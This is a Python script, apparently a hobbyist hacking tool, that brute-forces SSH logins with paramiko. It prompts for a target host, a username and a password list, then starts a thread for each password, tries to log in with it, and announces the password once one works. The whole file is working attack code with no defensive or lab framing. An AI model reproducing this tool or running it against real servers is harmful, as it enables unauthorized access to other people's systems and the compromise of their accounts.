import paramiko, sys, os, socket, termcolor
import threading, time

stopFlag = 0

# Try to astablish an SSH connection
def sshConnect(password, code=0):
    global stopFlag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
        stopFlag = 1
        print(termcolor.colored((f"[+] The SSH password has been found: {password} | Username: {username}"), 'green'))

    except:
        print(termcolor.colored(f'[-] Incorrect Password: {password}', 'red'))

    ssh.close()


host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
fileInput = input('[+] Passwords File: ')
print('\n')

if os.path.exists(fileInput) == False:
    print('Specified password file does not exist')
    sys.exit(1)

print(f'[***] Starting Threaded SSH BruteForce on {host} With Username {username} [***]')

with open(fileInput, 'r') as file:
    
    # Join the threads and close the program if the correct passowrd is found
    for line in file.readlines():
        if stopFlag == 1:
            t.join()
            exit()

        password = line.strip('\n')

        # Create the threads
        t = threading.Thread(target=sshConnect, args=(password,))
        t.start()
        time.sleep(0.07)

